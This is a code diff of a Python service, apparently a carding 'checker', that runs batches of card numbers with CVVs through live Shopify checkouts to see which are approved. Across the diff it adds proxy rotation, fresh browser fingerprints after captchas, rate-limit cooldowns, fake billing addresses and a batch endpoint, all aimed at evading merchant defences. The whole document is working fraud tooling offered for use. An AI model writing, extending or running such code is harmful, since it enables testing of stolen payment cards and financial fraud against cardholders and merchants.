-    "PH": {"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226", "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"},
-    "KR": {"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236", "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"},
-    "TW": {"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110", "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"},
-    "ZA": {"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001", "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"},
-    "IL": {"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101", "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"},
-    "TR": {"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430", "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"},
-    "SA": {"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271", "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"},
-}
-book.update(_EXTRA_BOOK)
-
-
-def _country_candidates(ourl, currency, overrides, cap=6):
-    """Pehle user override, phir currency ka country, phir TLD, phir fallback list."""
-    if overrides and overrides.get("countryCode"):
-        return [str(overrides["countryCode"]).upper()]
-    order = []
-    ccn = C2C.get((currency or "").upper())
-    if ccn and ccn in book and ccn not in order:
-        order.append(ccn)
-    tcn = urlparse(ourl).netloc.split(".")[-1].upper()
-    if tcn in book and tcn not in order:
-        order.append(tcn)
-    for c in FALLBACK_COUNTRIES:
-        if c in book and c not in order:
-            order.append(c)
-    if not order:
-        order = ["US"]
-    return order[:cap]
-
-
-def _apply_addr_to_vars(variables, addr, fn, ln):
-    sa = {
-        "address1": addr["address1"], "address2": "", "city": addr["city"],
-        "countryCode": addr["countryCode"], "postalCode": addr["postalCode"],
-        "firstName": fn, "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
-    }
     try:
-        variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = dict(sa)
-    except (KeyError, IndexError, TypeError):
-        pass
-    try:
-        variables["payment"]["billingAddress"]["streetAddress"] = dict(sa)
-    except (KeyError, TypeError):
-        pass
-    try:
-        variables["buyerIdentity"]["customer"]["countryCode"] = addr["countryCode"]
-        variables["buyerIdentity"]["phoneCountryCode"] = addr["countryCode"]
-        variables["buyerIdentity"]["shopPayOptInPhone"]["countryCode"] = addr["countryCode"]
-    except (KeyError, TypeError):
-        pass
+        await _host_pace(urlparse(url).netloc)
+        await session.post(f"{url}/cart/add.js",
+                           data=f"id={variant_id}&quantity=1",
+                           headers={**doc_headers,
+                                    "Content-Type": "application/x-www-form-urlencoded",
+                                    "Accept": "application/json, text/javascript"},
+                           proxy=proxy)
+        resp = await session.post(f"{url}/checkout/", allow_redirects=True,
+                                  headers=doc_headers, proxy=proxy)
+        text = await resp.text()
+        cu = str(resp.url)
+        sst = (resp.headers.get("X-Checkout-One-Session-Token")
+               or resp.headers.get("x-checkout-one-session-token"))
+        if not sst:
+            sst = (extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
+                   or extract_between(text, 'name="serialized-sessionToken" content="', '"')
+                   or extract_between(text, '"serializedSessionToken":"', '"')
+                   or extract_between(text, 'data-session-token="', '"'))
+        return cu, text, sst, resp.status
+    except Exception:
+        return last
 
+
+# ==============================================================================
+#  CORE CHECKOUT  (single attempt)
+# ==============================================================================
 
 async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                         proxy_str=None, overrides=None, fp=None):
@@ -1083,6 +1276,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
 
     checkpoint = None
     queue_token = None
+    host = urlparse(ourl).netloc
 
     try:
         headers = _checkout_headers(ourl, fp)
@@ -1118,39 +1312,30 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 variant_id = info["variant_id"]
                 _cache_set(ourl, variant_id)
 
-            # ---- Step: cart permalink -> checkout document ----
             doc_headers = _document_headers(ourl, fp)
-            resp = await session.get(f"{url}/cart/{variant_id}:1", allow_redirects=True,
-                                     headers=doc_headers, proxy=proxy)
-            checkout_url = str(resp.url)
-            text = await resp.text()
+            checkout_url, text, sst, status = await _open_checkout(
+                session, url, variant_id, proxy, doc_headers)
+
+            if status in (429, 430, 503):
+                return False, "RATE_LIMITED", gateway, total_price, currency, pstat
+            if not checkout_url:
+                return False, "CONNECTION_ERROR: cart", gateway, total_price, currency, pstat
 
             atm = (re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
                    or re.search(r"/checkouts/(?:c/)?([^/?]+)", checkout_url))
             attempt = atm.group(1) if atm else checkout_url.split("/")[-1].split("?")[0]
-
-            sst = (resp.headers.get("X-Checkout-One-Session-Token")
-                   or resp.headers.get("x-checkout-one-session-token"))
-            if not sst:
-                sst = (extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
-                       or extract_between(text, 'name="serialized-sessionToken" content="', '"')
-                       or extract_between(text, '"serializedSessionToken":"', '"')
-                       or extract_between(text, 'data-session-token="', '"'))
 
             if "login" in checkout_url.lower():
                 return False, "Site requires login!", gateway, total_price, currency, pstat
 
             raw = _unescape(text)
             queue_token = (extract_between(text, "queueToken&quot;:&quot;", "&quot;")
-                           or extract_between(text, '"queueToken":"', '"')
                            or extract_between(raw, '"queueToken":"', '"'))
             stable_id = extract_stable_id(text) or str(uuid.uuid4())
 
             if not sst:
                 if "password" in text.lower() and ("enter" in text.lower() or "store" in text.lower()):
                     return False, "Site is password protected", gateway, total_price, currency, pstat
-                if resp.status in (429, 430, 503):
-                    return False, "RATE_LIMITED", gateway, total_price, currency, pstat
                 return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, pstat
 
             merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
@@ -1202,10 +1387,12 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             if build_id:
                 headers["x-checkout-web-build-id"] = build_id
                 headers["x-checkout-web-deploy-stage"] = "production"
+                headers["x-checkout-web-server-handling"] = "fast"
+                headers["x-checkout-web-server-rendering"] = "yes"
             if source_token:
                 headers["x-checkout-web-source-id"] = source_token
 
-            gql_host = urlparse(checkout_url).netloc or urlparse(ourl).netloc
+            gql_host = urlparse(checkout_url).netloc or host
             gql_url = f"https://{gql_host}/checkouts/unstable/graphql"
             params = {"operationName": "Proposal"}
 
@@ -1281,7 +1468,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             json_data = {"query": QUERY_PROPOSAL_SHIPPING, "variables": variables,
                          "operationName": "Proposal"}
 
-            # ---- Proposal (country fallback loop) ----
+            # ---- Proposal with country fallback ----
             _cands = _country_candidates(ourl, currency, overrides)
             seller = None
             for _ci, _ctry in enumerate(_cands):
@@ -1294,11 +1481,14 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 phone = _addr["phone"]
                 _apply_addr_to_vars(variables, _addr, fn, ln)
 
+                await _host_pace(gql_host)
                 r = await session.post(gql_url, params=params, headers=headers,
                                        json=json_data, proxy=proxy)
                 rt = await r.text()
                 if is_captcha(rt):
                     return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
+                if r.status in (429, 430, 503):
+                    return False, "RATE_LIMITED", gateway, total_price, currency, pstat
                 try:
                     rj = json.loads(rt)
                 except json.JSONDecodeError:
@@ -1324,10 +1514,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 except (KeyError, TypeError) as e:
                     return False, f"Proposal parse error: {e}", gateway, total_price, currency, pstat
 
-                _dl = (seller or {}).get("delivery") or {}
-                _dt = _dl.get("__typename")
-                # UnavailableTerms = ye country ship nahi karta -> next country
-                # Filled / Pending = theek hai, aage badho
+                _dt = ((seller or {}).get("delivery") or {}).get("__typename")
                 if _dt != "UnavailableTerms":
                     break
                 if _ci + 1 >= len(_cands):
@@ -1347,7 +1534,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 "tax_amount": None,
             }
             _, tax_type = _apply_seller_money(seller, totals)
-            running_total = totals["running_total"]
             total_price = totals["total_price"]
             currency = totals["currency"]
             tax_amount = totals["tax_amount"]
@@ -1374,7 +1560,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             if not payment_identifier:
                 return False, "No valid payment method found", gateway, total_price, currency, pstat
 
-            # ---- Delivery confirm (always) ----
+            # ---- Delivery confirm ----
             if requires_shipping:
                 variables["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                     _delivery_strategy_input(True, delivery_strategy)
@@ -1393,11 +1579,14 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             variables["payment"]["billingAddress"] = billing
             variables["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone
 
+            await _host_pace(gql_host)
             r = await session.post(gql_url, params=params, headers=headers,
                                    json=json_data, proxy=proxy)
             rt = await r.text()
             if is_captcha(rt):
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
+            if r.status in (429, 430, 503):
+                return False, "RATE_LIMITED", gateway, total_price, currency, pstat
             try:
                 dj = json.loads(rt)
             except json.JSONDecodeError:
@@ -1410,25 +1599,24 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             if dres.get("checkpointData"):
                 checkpoint = dres["checkpointData"]
             _apply_seller_money(dseller, totals)
-            running_total = totals["running_total"]
             total_price = totals["total_price"]
             currency = totals["currency"]
             tax_amount = totals["tax_amount"]
             _apply_seller_delivery(dseller, ship)
-            _capture_artifacts(dseller, variables)          # 🔥 [PATCH-5]
+            _capture_artifacts(dseller, variables)
             delivery_strategy = ship["delivery_strategy"]
             signed_handle = ship.get("signed_handle")
             requires_shipping = ship["requires_shipping"]
 
-            # progressive rate / pending tax wait
             if requires_shipping and (tax_type == "PendingTerms" or not delivery_strategy):
                 await asyncio.sleep(min(_pending_ms(dseller), 1500) / 1000.0)
                 if requires_shipping and delivery_strategy:
                     variables["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                         _delivery_strategy_input(True, delivery_strategy)
-                r = await session.post(gql_url, params=params, headers=headers,
-                                       json=json_data, proxy=proxy)
                 try:
+                    await _host_pace(gql_host)
+                    r = await session.post(gql_url, params=params, headers=headers,
+                                           json=json_data, proxy=proxy)
                     dj2 = json.loads(await r.text())
                     dres2 = dj2.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
                     ds2 = dres2.get("sellerProposal")
@@ -1439,7 +1627,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     if ds2:
                         _apply_seller_money(ds2, totals)
                         _apply_seller_delivery(ds2, ship)
-                        running_total = totals["running_total"]
                         total_price = totals["total_price"]
                         currency = totals["currency"]
                         tax_amount = totals["tax_amount"]
@@ -1452,13 +1639,14 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             if requires_shipping and not delivery_strategy:
                 requires_shipping = False
 
-            # ---- PCI token ----
+            # ---- PCI vault token (3-way proxy retry) ----
             vault_headers = {
                 "Content-Type": "application/json",
                 "Accept": "application/json",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Origin": "https://checkout.pci.shopifyinc.com",
-                "Referer": "https://checkout.pci.shopifyinc.com/",
+                "Referer": ("https://checkout.pci.shopifyinc.com/build/number-ltr.html"
+                            "?identifier=&locationURL="),
                 "User-Agent": headers["User-Agent"],
                 "sec-ch-ua": fp["sec-ch-ua"],
                 "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"],
@@ -1466,6 +1654,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
+                "sec-fetch-storage-access": "active",
             }
             if ident:
                 vault_headers["shopify-identification-signature"] = ident
@@ -1478,17 +1667,34 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 },
                 "payment_session_scope": urlparse(url).netloc,
             }
+
             token = None
-            for pxy in (proxy, None):
-                try:
-                    rr = await session.post(pci_url, json=payload, headers=vault_headers, proxy=pxy)
-                    vt = await rr.text()
-                    if vt.strip().startswith("{"):
-                        token = json.loads(vt).get("id")
+            seq = []
+            for p in (proxy, _rotate_proxy(proxy), None):
+                if p not in seq:
+                    seq.append(p)
+            for pxy in seq:
+                for _try in range(2):
+                    try:
+                        await _host_pace("checkout.pci.shopifyinc.com")
+                        rr = await session.post(pci_url, json=payload,
+                                                headers=vault_headers, proxy=pxy)
+                        vt = await rr.text()
+                        if rr.status in (429, 430, 503):
+                            _pcool_mark(pxy)
+                            _cooldown_proxy(pxy)
+                            await asyncio.sleep(0.25)
+                            continue
+                        if vt.strip().startswith("{"):
+                            token = json.loads(vt).get("id")
                         if token:
                             break
-                except Exception:
-                    continue
+                    except Exception:
+                        _cooldown_proxy(pxy)
+                        await asyncio.sleep(0.15)
+                        continue
+                if token:
+                    break
             if not token:
                 return False, "PCI_TOKEN_FAILED", gateway, total_price, currency, pstat
 
@@ -1585,7 +1791,6 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 }
                 if variables.get("transformerFingerprintV2"):
                     inp["transformerFingerprintV2"] = variables["transformerFingerprintV2"]
-                # 🔥 [PATCH-3] required artifacts submit me echo karo
                 if variables.get("nonNegotiableTerms"):
                     inp["nonNegotiableTerms"] = variables["nonNegotiableTerms"]
                 if variables.get("captcha"):
@@ -1599,6 +1804,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
             for submit_try in range(3):
                 sub_json = {"query": MUTATION_SUBMIT, "variables": sub_vars,
                             "operationName": "SubmitForCompletion"}
+                await _host_pace(gql_host)
                 r = await session.post(gql_url, params=sub_params, headers=headers,
                                        json=sub_json, proxy=proxy)
                 text = await r.text()
@@ -1607,16 +1813,14 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                 if ("The requested payment method is not available." in text
                         and '"submitForCompletion"' not in text):
                     return False, "Payment method not available", gateway, total_price, currency, pstat
+                if r.status in (429, 430, 503):
+                    return False, "RATE_LIMITED", gateway, total_price, currency, pstat
 
                 try:
                     sj = json.loads(text)
                 except json.JSONDecodeError:
                     return False, _nonjson_code(r.status, text), gateway, total_price, currency, pstat
 
-                try:
-                    open("/tmp/last_submit.json", "w").write(text)
-                except Exception:
-                    pass
                 sub = (sj.get("data") or {}).get("submitForCompletion") or {}
                 if not sub:
                     for e in sj.get("errors", []):
@@ -1631,9 +1835,9 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                     errs = sub.get("errors") or []
                     codes = [e.get("code") for e in errs if e.get("code")]
 
-                    # 🔥 [PATCH-7] artifacts stale -> fresh negotiate, phir dobara submit
-                    if _needs_renagotiate(codes) and submit_try < 2:
+                    if (_needs_renagotiate(codes) or _reject_needs_accept(codes)) and submit_try < 2:
                         try:
+                            await _host_pace(gql_host)
                             rr = await session.post(gql_url, params=params, headers=headers,
                                                     json=json_data, proxy=proxy)
                             rj2 = json.loads(await rr.text())
@@ -1655,34 +1859,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                                 signed_handle = ship.get("signed_handle")
                                 requires_shipping = ship["requires_shipping"]
                         except Exception as e:
-                            print(f"renegotiate refresh fail: {e}")
-                        sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
-                        continue
-
-                    if _reject_needs_accept(codes) and submit_try < 2:
-                        try:
-                            rr = await session.post(gql_url, params=params, headers=headers,
-                                                    json=json_data, proxy=proxy)
-                            rj2 = json.loads(await rr.text())
-                            res2 = rj2["data"]["session"]["negotiate"]["result"]
-                            s2 = res2.get("sellerProposal")
-                            if res2.get("checkpointData"):
-                                checkpoint = res2["checkpointData"]
-                            if res2.get("queueToken"):
-                                queue_token = res2["queueToken"]
-                            if s2:
-                                seller = s2
-                                _capture_artifacts(s2, variables)
-                                _apply_seller_money(s2, totals)
-                                _apply_seller_delivery(s2, ship)
-                                total_price = totals["total_price"]
-                                currency = totals["currency"]
-                                tax_amount = totals["tax_amount"]
-                                delivery_strategy = ship["delivery_strategy"]
-                                signed_handle = ship.get("signed_handle")
-                                requires_shipping = ship["requires_shipping"]
-                        except Exception as e:
-                            print(f"accept refresh fail: {e}")
+                            log.debug("renegotiate refresh fail: %s", e)
                         sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
                         continue
 
@@ -1741,6 +1918,7 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                          "variables": {"receiptId": rid, "sessionToken": sst},
                          "operationName": "PollForReceipt"}
             for _ in range(5):
+                await _host_pace(gql_host)
                 r = await session.post(gql_url, params=poll_params, headers=headers,
                                        json=poll_json, proxy=proxy)
                 ft = await r.text()
@@ -1786,88 +1964,81 @@ async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
 
 
 # ==============================================================================
-#  [FIX-4] RETRY WRAPPER — captcha gets a brand-new fingerprint + session
+#  RETRY / ROTATION WRAPPER
 # ==============================================================================
-
-_RETRYABLE = ("required_artifacts", "artifacts_unavailable", "stale_artifact",
-              "signature_mismatch", "checkpoint_data_invalid",
-              "timeout", "connection", "throttled", "network", "unreachable", "reset",
-              "eof", "broken pipe", "chunked", "unexpected", "rate_limited",
-              "server disconnected", "connection_error", "unparseable",
-              "checkout_session_failed", "generic_error")
-
-
-def _is_retryable(msg):
-    m = str(msg).lower()
-    return any(k in m for k in _RETRYABLE)
-
-
-def _is_captcha_msg(msg):
-    return "CAPTCHA_REQUIRED" in str(msg).upper()
-
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                        proxy_str=None, max_retries=None, overrides=None):
     retries = MAX_RETRIES if max_retries is None else max_retries
     captcha_budget = CAPTCHA_RETRY
+    net_budget = NET_RETRIES
+    rl_budget = RL_RETRIES
+    cur_proxy = proxy_str
     last = None
 
-    for attempt in range(retries + 1):
+    total_iters = retries + captcha_budget + net_budget + rl_budget + 2
+    for attempt in range(total_iters):
         fp = new_fingerprint()
+        await _rl_wait()
+
         res = await _process_card(cc, mes, ano, cvv, site_url, variant_id,
-                                  proxy_str, overrides, fp)
+                                  cur_proxy, overrides, fp)
         last = res
         if res[0] is True:
             return res
 
-        if _is_captcha_msg(res[1]) and captcha_budget > 0:
+        msg = res[1]
+
+        if _is_captcha_msg(msg) and captcha_budget > 0:
             captcha_budget -= 1
-            await asyncio.sleep(0.6 + random.random() * 0.9)
+            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
+            await asyncio.sleep(0.5 + random.random() * 0.8)
             continue
 
-        if _is_retryable(res[1]) and attempt < retries:
-            await asyncio.sleep(0.3 * (2 ** attempt))
+        if _is_rate_limited_msg(msg) and rl_budget > 0:
+            rl_budget -= 1
+            _pcool_mark(cur_proxy)
+            _cooldown_proxy(cur_proxy)
+            _rl_pause()
+            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
+            await asyncio.sleep(0.4 + random.random() * 0.6)
             continue
+
+        if _is_net_err(msg) and net_budget > 0:
+            net_budget -= 1
+            _cooldown_proxy(cur_proxy)
+            _mark_proxy_fail(cur_proxy)
+            cur_proxy = _rotate_proxy(cur_proxy) or cur_proxy
+            await asyncio.sleep(0.2 + random.random() * 0.4)
+            continue
+
+        if _is_retryable(msg) and attempt < total_iters - 1:
+            await asyncio.sleep(0.25 * (2 ** min(attempt, 3)))
+            continue
+
         return res
 
     return last
 
 
 # ==============================================================================
-#  CONCURRENCY ENGINE
+#  CONCURRENCY
 # ==============================================================================
 
-_loop = None
-_loop_thread = None
 _global_sem = None
 _user_sems = {}
 _start_gate_lock = None
 _last_start = 0.0
 
-STATS = {
-    "total": 0,
-    "ok": 0,
-    "captcha": 0,
-    "declined": 0,
-    "started": time.time(),
-}
-_stats_lock = threading.Lock()
+STATS = {"total": 0, "ok": 0, "captcha": 0, "declined": 0, "started": time.time()}
 
 
-def _bg(loop):
-    asyncio.set_event_loop(loop)
+def _sem():
+    """Lazy — aiohttp ke loop me hi banta hai, koi cold-start race nahi."""
     global _global_sem
-    _global_sem = asyncio.Semaphore(GLOBAL_MAX_CONCUR)
-    loop.run_forever()
-
-
-def get_loop():
-    global _loop, _loop_thread
-    if _loop is None or _loop.is_closed():
-        _loop = asyncio.new_event_loop()
-        _loop_thread = threading.Thread(target=_bg, args=(_loop,), daemon=True)
-        _loop_thread.start()
-    return _loop
+    if _global_sem is None:
+        _global_sem = asyncio.Semaphore(GLOBAL_MAX_CONCUR)
+    return _global_sem
 
 
 def _gate_lock():
@@ -1879,6 +2050,8 @@ def _gate_lock():
 
 async def _admit():
     global _last_start
+    if START_STAGGER <= 0:
+        return
     async with _gate_lock():
         now = time.time()
         wait = START_STAGGER - (now - _last_start)
@@ -1889,18 +2062,18 @@ async def _admit():
 
 async def _throttled(cc, mes, ano, cvv, site, variant, proxy, user_key="default",
                      overrides=None, max_retries=None):
-    if user_key not in _user_sems:
-        _user_sems[user_key] = asyncio.Semaphore(PER_USER_CONCUR)
-    async with _user_sems[user_key]:
-        async with _global_sem:
+    us = _user_sems.get(user_key)
+    if us is None:
+        us = _user_sems[user_key] = asyncio.Semaphore(PER_USER_CONCUR)
+    async with us:
+        async with _sem():
             await _admit()
             return await process_card(cc, mes, ano, cvv, site, variant, proxy,
                                       max_retries, overrides)
 
 
 def _bump(field, n=1):
-    with _stats_lock:
-        STATS[field] = STATS.get(field, 0) + n
+    STATS[field] = STATS.get(field, 0) + n
 
 
 def _build_result(cc_string, success, message, gateway, price, currency,
@@ -1931,15 +2104,11 @@ def _build_result(cc_string, success, message, gateway, price, currency,
 
 
 # ==============================================================================
-#  FLASK APP
+#  REQUEST PARSING HELPERS
 # ==============================================================================
 
-app = Flask(__name__)
-try:
-    app.json.sort_keys = False
-except Exception:
-    pass
-logging.getLogger("werkzeug").setLevel(logging.ERROR)
+def _dumps(obj):
+    return json.dumps(obj, ensure_ascii=False)
 
 
 def _parse_card(s):
@@ -1975,44 +2144,99 @@ def _pick_proxy(raw):
     return raw
 
 
-def _int_arg(args, name, default):
+def _int_or_none(v):
     try:
-        return int(args.get(name))
+        return int(v)
     except (TypeError, ValueError):
-        return default
+        return None
 
 
-@app.route("/shopify", methods=["GET"])
-def shopify():
+# ==============================================================================
+#  WEB APP  (aiohttp — fully async, koi thread cap nahi)
+# ==============================================================================
+
+routes = web.RouteTableDef()
+
+
+@routes.get("/")
+async def health(request):
+    return web.json_response({
+        "status": "ok", "engine": "aiohttp", "port": PORT,
+        "global_max": GLOBAL_MAX_CONCUR, "per_user": PER_USER_CONCUR,
+        "seen_proxies": len(_SEEN_LIST), "pool_file": len(PROXY_POOL),
+    }, dumps=_dumps)
+
+
+@routes.get("/status")
+async def status(request):
+    return web.json_response({
+        "status": "online",
+        "engine": "aiohttp.web",
+        "global_max": GLOBAL_MAX_CONCUR,
+        "per_user": PER_USER_CONCUR,
+        "active_users": len(_user_sems),
+        "seen_proxies": len(_SEEN_LIST),
+        "proxies_txt_pool": len(PROXY_POOL),
+        "cached_sites": len(_SITE_CACHE),
+        "rotate": ROTATE,
+        "force_close": FORCE_CLOSE,
+        "fingerprint_mode": FINGERPRINT_MODE,
+        "rl_pause_until": round(_RL_PAUSE_UNTIL, 2),
+        "endpoints": {
+            "single": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
+            "batch": "POST /batch {site,cards[],proxies[]}",
+            "stats": "GET /stats",
+        },
+    }, dumps=_dumps)
+
+
+@routes.get("/stats")
+async def stats(request):
+    s = dict(STATS)
+    s["uptime_sec"] = round(time.time() - s.get("started", time.time()), 1)
+    s["seen_proxies"] = len(_SEEN_LIST)
+    return web.json_response(s, dumps=_dumps)
+
+
+@routes.get("/shopify")
+async def shopify(request):
+    t0 = time.time()
+    q = request.query
     try:
-        t0 = time.time()
-        site = request.args.get("site")
-        card_s = request.args.get("card") or request.args.get("cc")
-        proxy = _pick_proxy(request.args.get("proxy"))
-        if not proxy:
-            proxy = _auto_proxy()
-        user_key = request.args.get("key", "default")
-        variant = request.args.get("variant")
-        overrides = _addr_overrides(request.args)
-        max_retries = _int_arg(request.args, "retries", None)
+        site = q.get("site")
+        card_s = q.get("card") or q.get("cc")
+        raw_proxy = _pick_proxy(q.get("proxy"))
+        if not raw_proxy:
+            raw_proxy = _auto_proxy()
+        if raw_proxy:
+            purl = parse_proxy(raw_proxy)
+            if purl:
+                _seen_proxy(purl)
+
+        user_key = q.get("key", "default")
+        variant = q.get("variant")
+        overrides = _addr_overrides(q)
+        max_retries = _int_or_none(q.get("retries"))
 
         if not site:
-            return jsonify({"error": "Missing 'site'", "status": False}), 400
+            return web.json_response({"error": "Missing 'site'", "status": False}, status=400)
         if not card_s:
-            return jsonify({"error": "Missing 'card'", "status": False}), 400
+            return web.json_response({"error": "Missing 'card'", "status": False}, status=400)
         try:
             p = _parse_card(card_s)
         except ValueError as e:
-            return jsonify({"error": str(e), "status": False}), 400
+            return web.json_response({"error": str(e), "status": False}, status=400)
 
         _bump("total")
-        loop = get_loop()
-        fut = asyncio.run_coroutine_threadsafe(
-            _throttled(p["cc"], p["mes"], p["ano"], p["cvv"], site, variant,
-                       proxy, user_key, overrides, max_retries),
-            loop,
-        )
-        ok, msg, gw, price, cur, pstat = fut.result(timeout=150)
+
+        try:
+            ok, msg, gw, price, cur, pstat = await _throttled(
+                p["cc"], p["mes"], p["ano"], p["cvv"], site, variant,
+                raw_proxy, user_key, overrides, max_retries)
+        except Exception as e:
+            ok, msg, gw, price, cur, pstat = (
+                False, f"ERROR: {e}", "UNKNOWN", "0.00", "USD", "Not Used")
+
         out = _build_result(card_s, ok, msg, gw, price, cur, time.time() - t0, pstat)
         out["site"] = site
 
@@ -2023,169 +2247,105 @@ def shopify():
         else:
             _bump("declined")
 
-        print(f"{out['cc']}  {out['Response']}  ${out['Price']} {out['Currency']}  "
-              f"{out['Time']}  [{out['Proxy']}]  {site}")
-        return jsonify(out)
+        return web.json_response(out, dumps=_dumps)
 
     except Exception as e:
-        return jsonify(_build_result(
-            request.args.get("card") or request.args.get("cc", ""), False,
-            f"ERROR: {e}", "UNKNOWN", 0.0, "USD", 0.0,
-            "Dead" if request.args.get("proxy") else "Not Used",
-        )), 500
+        return web.json_response(_build_result(
+            q.get("card") or q.get("cc", ""), False, f"ERROR: {e}",
+            "UNKNOWN", 0.0, "USD", 0.0,
+            "Dead" if q.get("proxy") else "Not Used"), status=500, dumps=_dumps)
 
 
-@app.route("/batch", methods=["POST"])
-def batch():
+@routes.post("/batch")
+async def batch(request):
+    t0 = time.time()
     try:
-        t0 = time.time()
-        data = request.get_json(force=True)
+        data = await request.json()
         site = data.get("site", "")
         cards = data.get("cards", [])
         variant = data.get("variant")
-        user_key = request.args.get("key", "default")
-        overrides = _addr_overrides(data) or _addr_overrides(request.args)
+        user_key = request.query.get("key", "default")
+        overrides = _addr_overrides(data) or _addr_overrides(request.query)
         proxies = data.get("proxies", []) or ([data["proxy"]] if data.get("proxy") else [])
         max_retries = data.get("retries", None)
         if not isinstance(max_retries, int):
             max_retries = None
 
         if not site:
-            return jsonify({"error": "Missing 'site'", "status": False}), 400
+            return web.json_response({"error": "Missing 'site'", "status": False}, status=400)
         if not isinstance(cards, list) or not cards:
-            return jsonify({"error": "Missing 'cards'", "status": False}), 400
+            return web.json_response({"error": "Missing 'cards'", "status": False}, status=400)
 
         parsed = []
         for i, c in enumerate(cards):
             px = proxies[i % len(proxies)] if proxies else _auto_proxy()
+            if px:
+                purl = parse_proxy(px)
+                if purl:
+                    _seen_proxy(purl)
             try:
                 parsed.append((c.strip(), _parse_card(c.strip()), px))
             except ValueError:
                 parsed.append((c.strip(), None, px))
 
         _bump("total", len(parsed))
-        loop = get_loop()
 
-        async def _run():
-            async def one(cs, p, px):
-                if p is None:
-                    return cs, False, "Invalid card format", "UNKNOWN", "0.00", "USD", (
-                        "Dead" if px else "Not Used")
-                try:
-                    return cs, *await _throttled(p["cc"], p["mes"], p["ano"], p["cvv"],
-                                                 site, variant, px, user_key,
-                                                 overrides, max_retries)
-                except Exception as ex:
-                    return cs, False, str(ex), "UNKNOWN", "0.00", "USD", (
-                        "Dead" if px else "Not Used")
-            return await asyncio.gather(*[one(*x) for x in parsed])
+        async def one(cs, p, px):
+            if p is None:
+                return cs, False, "Invalid card format", "UNKNOWN", "0.00", "USD", (
+                    "Dead" if px else "Not Used")
+            try:
+                return cs, *await _throttled(p["cc"], p["mes"], p["ano"], p["cvv"],
+                                             site, variant, px, user_key,
+                                             overrides, max_retries)
+            except Exception as ex:
+                return cs, False, str(ex), "UNKNOWN", "0.00", "USD", (
+                    "Dead" if px else "Not Used")
 
-        fut = asyncio.run_coroutine_threadsafe(_run(), loop)
-        results = fut.result(timeout=600)
+        results = await asyncio.gather(*[one(*x) for x in parsed])
+
         out = [_build_result(cs, ok, msg, gw, price, cur, None, ps)
                for cs, ok, msg, gw, price, cur, ps in results]
         for r in out:
             r["site"] = site
-        return jsonify({"results": out, "total_time": f"{time.time() - t0:.2f}s",
-                        "total_cards": len(out)})
+        return web.json_response({"results": out,
+                                  "total_time": f"{time.time() - t0:.2f}s",
+                                  "total_cards": len(out)}, dumps=_dumps)
     except Exception as e:
-        return jsonify({"error": str(e), "status": False}), 500
+        return web.json_response({"error": str(e), "status": False}, status=500)
 
 
-@app.route("/")
-def health():
-    return jsonify({"status": "ok", "engine": "running", "ports": [PORT] + _extra_ports()})
+def build_app():
+    app = web.Application(client_max_size=16 * 1024 * 1024)
+    app.add_routes(routes)
 
+    async def _on_start(app_):
+        _sem()
+        log.info("[ENGINE] port=%s global=%s per_user=%s rotate=%s force_close=%s "
